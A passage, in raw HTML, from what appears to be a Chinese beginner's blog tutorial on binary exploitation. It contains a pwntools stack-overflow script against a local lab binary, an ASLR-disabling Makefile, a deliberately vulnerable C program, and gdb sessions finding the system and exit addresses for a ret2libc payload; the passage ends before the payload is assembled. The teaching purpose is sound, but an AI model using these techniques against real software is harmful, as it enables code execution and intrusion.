&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;span class="lnt">8
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl"> movl $0, %eax
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> movq -8(%rbp), %rdx
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> subq %fs:40, %rdx
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> je .L5
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> call __stack_chk_fail@PLT
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">.L5:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> leave
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ret
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>明显能看出，&lt;code>%fs:40&lt;/code> 就是上文引用中所谓的 &lt;em>a secret value placed on the stack which changes every time the program is started&lt;/em> 。&lt;/p>
&lt;h4 id="栈对齐">栈对齐&lt;/h4>
&lt;p>在64位系统上，栈默认会对齐到 16 字节（也许看编译器默认参数，在我的实验环境中是这样的）。例如案例中 &lt;code>question.c&lt;/code> 的 &lt;code>secret&lt;/code> 我们可以看做 4 字节大小（&lt;em>具体大小和你的系统、CPU、编译器都有关系&lt;/em>），也就是 &lt;code>buffer&lt;/code> 加上 &lt;code>secret&lt;/code> 一共 104 个字节，除 16 得 6.5 显然是没对齐的。编译器会自动分配对齐到 16 字节的栈大小：112 。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">main:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> pushq %rbp
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> movq %rsp, %rbp
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> subq $112, %rsp # align to 16 bytes
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> movl $305419896, -4(%rbp)
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> movq $0, -112(%rbp)
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> movq $0, -104(%rbp)
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> movq $0, -96(%rbp)
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> movq $0, -88(%rbp)
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> movq $0, -80(%rbp)
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> movq $0, -72(%rbp)
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> movq $0, -64(%rbp)
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> movq $0, -56(%rbp)
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> movq $0, -48(%rbp)
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> movq $0, -40(%rbp)
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> movq $0, -32(%rbp)
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> movq $0, -24(%rbp)
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> movl $0, -16(%rbp)
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> leaq -4(%rbp), %rdx # %rdx =&amp;gt; secret
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> leaq -112(%rbp), %rax # %rax =&amp;gt; buffer
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>简单计算可得 &lt;code>-4(%rbp) ~ (%rbp)&lt;/code> 是 &lt;code>secret&lt;/code>，&lt;code>-12(%rbp) ~ -4(%rbp)&lt;/code> 是为了对齐而填充的大小。&lt;/p>
&lt;p>如果我们想溢出覆盖 &lt;code>secret&lt;/code> 的值，则需要填充 100 字节的 &lt;code>buffer&lt;/code> + 8 字节的对齐 + 4 字节 &lt;code>secret&lt;/code> 值，一共 112 字节的 payload。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;span class="lnt">8
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">pwn&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">struct&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">proc&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">pwn&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">process&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;./question64&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">b&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">struct&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">pack&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;@q&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x1234&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">b&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">proc&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">sendline&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">b&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="se">\x41&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">100&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="sa">b&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="se">\x00&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="mi">8&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">b&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">proc&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">recv&lt;/span>&lt;span class="p">()&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">decode&lt;/span>&lt;span class="p">())&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>结果：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-plaintext" data-lang="plaintext">&lt;span class="line">&lt;span class="cl">(.venv) vm :: repos/pwn/lab-1 » python exploit64.py
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">[+] Starting local process &amp;#39;./question64&amp;#39;: pid 10128
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">b&amp;#39;4\x12\x00\x00\x00\x00\x00\x00&amp;#39;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">[*] Process &amp;#39;./question64&amp;#39; stopped with exit code 0 (pid 10128)
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">buffer: 0x7ffc03d29950, secret: 0x7ffc03d299bc
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">cool!
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="rop-基础">ROP 基础&lt;/h2>
&lt;p>有趣的部分真正开始。ROP 全称是 &lt;em>Return Oriented Programming&lt;/em>，一种通过返回指令串联代码片段，以执行复杂逻辑的技术思想。参考文章：&lt;a class="link" href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#rop" target="_blank" rel="noopener"
>ctf wiki - 基本ROP&lt;/a>。&lt;/p>
&lt;h3 id="原理-1">原理&lt;/h3>
&lt;p>从简单的开始说起。&lt;code>call&lt;/code>指令的本质是压栈IP寄存器接一个无条件跳转指令。而&lt;code>ret&lt;/code>指令本质是从栈上弹出一个地址，然后无条件跳转。&lt;/p>
&lt;p>那么能用&lt;code>ret&lt;/code>替代&lt;code>call&lt;/code>指令吗？把&lt;code>ret&lt;/code>当成&lt;code>jmp&lt;/code>来用，当然没什么不能的（考虑 x86/cdecl 调用约定）。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/%E5%85%A5%E9%97%A8pwn/image-20220816110634684.png"
width="681"
height="455"
srcset="https://nnnewb.github.io/blog/blog/p/%E5%85%A5%E9%97%A8pwn/image-20220816110634684_hu1e91792cb936de74538b3afcb26b0fa4_141437_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/%E5%85%A5%E9%97%A8pwn/image-20220816110634684_hu1e91792cb936de74538b3afcb26b0fa4_141437_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220816110634684"
class="gallery-image"
data-flex-grow="149"
data-flex-basis="359px"
>&lt;/p>
&lt;p>&lt;code>ret&lt;/code> 指令执行后，栈上布局就会变成：&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/%E5%85%A5%E9%97%A8pwn/image-20220816110756861.png"
width="411"
height="215"
srcset="https://nnnewb.github.io/blog/blog/p/%E5%85%A5%E9%97%A8pwn/image-20220816110756861_hu826fa0eb13028bd3969e5fe5a03dc856_22934_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/%E5%85%A5%E9%97%A8pwn/image-20220816110756861_hu826fa0eb13028bd3969e5fe5a03dc856_22934_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220816110756861"
class="gallery-image"
data-flex-grow="191"
data-flex-basis="458px"
>&lt;/p>
&lt;p>和正常函数调用如出一辙。&lt;/p>
&lt;h3 id="aslr">ASLR&lt;/h3>
&lt;p>想要实现自由控制跳转地址和参数的目的，还有一个拦路虎叫 ASLR 不作更多解释。通过 &lt;code>sysctl&lt;/code> 或编辑 &lt;code>/proc/sys/kernel/randomize_va_space&lt;/code> 控制。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-makefile" data-lang="makefile">&lt;span class="line">&lt;span class="cl">&lt;span class="nf">.PHONY&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="n">disable&lt;/span>-&lt;span class="n">aslr&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nf">disable-aslr&lt;/span>&lt;span class="o">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">echo&lt;/span> &lt;span class="m">0&lt;/span> &lt;span class="p">|&lt;/span> sudo tee /proc/sys/kernel/randomize_va_space
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nf">.PHONY&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="n">enable&lt;/span>-&lt;span class="n">aslr&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nf">enable-aslr&lt;/span>&lt;span class="o">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">echo&lt;/span> &lt;span class="m">1&lt;/span> &lt;span class="p">|&lt;/span> sudo tee /proc/sys/kernel/randomize_va_space
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>之后可以多次运行 &lt;code>question32&lt;/code> ，观察输出来确认栈地址是否变化。&lt;/p>
&lt;h3 id="ret2libc">ret2libc&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// gcc question.c -m32 -fno-stack-protector -no-pie -g -O0 -o question32
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;unistd.h&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">char&lt;/span> &lt;span class="n">name&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">100&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s">&amp;#34;&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">int&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">void&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">char&lt;/span> &lt;span class="n">buffer&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">100&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s">&amp;#34;&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;name: %p buffer: %p&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">name&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">buffer&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;what&amp;#39;s your name?&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">read&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">STDIN_FILENO&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">name&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="k">sizeof&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">name&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;Welcome, %s. Show your hack skill.&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">name&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">read&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">STDIN_FILENO&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">buffer&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x100&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>简单写一个脚本。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">pwn&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">pwn&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="n">gdb&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">process&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">struct&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">p32s&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">struct&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">pack&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;&amp;lt;&amp;#34;&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="s2">&amp;#34;I&amp;#34;&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="nb">len&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">),&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">p&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">gdb&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">debug&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;./question32&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;&amp;#39;&amp;#39;
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">b question.c:13
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">continue
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">&amp;#39;&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">p&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">interactive&lt;/span>&lt;span class="p">()&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>观察程序的 epilogue 部分，&lt;code>main()&lt;/code> 在 prologue 部分保存了 &lt;code>%ecx&lt;/code>、&lt;code>%edi&lt;/code>、&lt;code>%ebx&lt;/code> 寄存器的值，在清栈阶段会恢复这些寄存器。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl"> leal -12(%ebp), %esp
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> popl %ecx
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> popl %ebx
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> popl %edi
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> popl %ebp
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> leal -4(%ecx), %esp
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ret
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>需要注意的是 &lt;code>%ecx&lt;/code> 寄存器的值会被用作 &lt;code>%esp&lt;/code> ，而我们覆写返回地址必然导致 &lt;code>%ecx&lt;/code> 寄存器的值被覆写，所以需要提前算好 &lt;code>leal -4(%ecx), %esp&lt;/code> 指令执行后 &lt;code>%esp&lt;/code> 指向的位置，让 &lt;code>%esp&lt;/code> 刚好指向我们期望的 &lt;code>system&lt;/code> 函数地址。&lt;/p>
&lt;p>脚本启动 gdb 后先计算下 &lt;code>&amp;amp;buffer&lt;/code> 到 &lt;code>movl -12(%ebp), %esp&lt;/code> 这条指令后的 &lt;code>%esp&lt;/code> 的距离，也就是从&lt;code>buffer&lt;/code>一路写到栈上保存的 &lt;code>%ecx&lt;/code> 前所需填充的长度。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-plaintext" data-lang="plaintext">&lt;span class="line">&lt;span class="cl">gdb-peda$ p &amp;amp;buffer
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">$1 = (char (*)[100]) 0xffffd0dc
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">gdb-peda$ distance 0xffffd0dc
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">From 0xffffd14c (SP) to 0xffffd0dc: -112 bytes, -28 dwords
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">gdb-peda$
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>得到长度后简单计算下 &lt;code>&amp;amp;buffer(0xffffd0dc) + padding_size(112) + register(4) * 4&lt;/code> 等于 &lt;code>0xffffd1bc&lt;/code>，这个地址就是我们溢出后覆写的返回地址所在位置，这个地址加上 4 就是 &lt;code>%ecx&lt;/code> 的取值了。&lt;/p>
&lt;p>最后获取 &lt;code>system&lt;/code> 函数的地址和 &lt;code>name&lt;/code> 的地址，作为 &lt;code>system&lt;/code> 函数的返回地址我们再获取一下 &lt;code>exit&lt;/code> 函数的地址。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-plaintext" data-lang="plaintext">&lt;span class="line">&lt;span class="cl">gdb-peda$ p &amp;amp;system
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">$1 = (&amp;lt;text variable, no debug info&amp;gt; *) 0xf7dcbcb0 &amp;lt;system&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">gdb-peda$ p &amp;amp;name
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">$2 = (char (*)[100]) 0x804c060 &amp;lt;name&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">gdb-peda$ p &amp;amp;exit
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">$3 = (&amp;lt;text variable, no debug info&amp;gt; *) 0xf7dbe1c0 &amp;lt;exit&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">gdb-peda$
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>综合这些元素组装一个 payload 。&lt;/p>
